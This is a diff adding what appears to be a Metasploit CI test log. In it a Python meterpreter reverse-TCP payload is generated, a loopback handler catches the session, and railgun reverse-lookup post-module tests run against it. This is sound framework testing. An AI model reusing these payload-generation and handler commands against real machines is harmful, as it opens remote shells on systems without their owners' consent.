@@ -1,0 +1,29 @@
+use python/meterpreter_reverse_tcp
+msf6 post(test/meterpreter) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5512-p52rhttxt
+msf6 payload(python/meterpreter_reverse_tcp) > msf6 payload(python/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-5512-p52rhttxt
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5512-u96lkg.py -f raw AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/pythonmeterpreter_reverse_tcp_debug_log20231026-5512-bqp94btxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Writing 24924 bytes to D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20231026-5512-u96lkg.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 1
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:49998) at 2023-10-26 19:03:53 +0000
+use test/railgun_reverse_lookups
+msf6 post(test/railgun_reverse_lookups) > run session=2 AddEntropy=true Verbose=true
+[*] Running against session 2
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[*] SKIPPED: def test_linux_static (session platform is not osx)
+[+] should return a constant name given a const and a filter
+[+] should return an error string given an error code
+[*] Testing complete in 0.25 seconds
+[*] Passed: 4; Failed: 0; Skipped: 2
+[*] Post module execution completed
+msf6 post(test/railgun_reverse_lookups) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 2 closed.
+msf6 post(test/railgun_reverse_lookups) > Stopping all jobs...
+msf6 post(test/railgun_reverse_lookups) > 
